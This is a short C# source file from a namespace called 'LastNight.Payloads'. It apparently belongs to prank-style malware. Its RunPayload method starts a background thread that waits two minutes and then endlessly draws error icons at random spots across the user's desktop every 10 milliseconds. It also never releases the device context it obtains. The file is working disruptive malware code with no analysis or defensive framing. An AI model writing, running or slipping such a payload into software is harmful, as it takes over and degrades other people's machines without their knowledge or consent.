using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LastNight.Payloads
{
    public class DrawIcons
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [DllImport("user32.dll")]
        public static extern IntPtr LoadIcon(IntPtr hInstance, string lpIconName);

        public void RunPayload()
        {
            Thread thr = new Thread(new ThreadStart(() =>
            {
                Thread.Sleep(120000); // 120sec
                while (true)
                {
                    IntPtr hDc = GetWindowDC(GetDesktopWindow());
                    int x = new Random().Next() % GetSystemMetrics(0);
                    int y = new Random().Next() % GetSystemMetrics(1);

                    DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, "#32513"));
                    Thread.Sleep(10);
                }
            }));
            thr.Start();
        }
    }
}
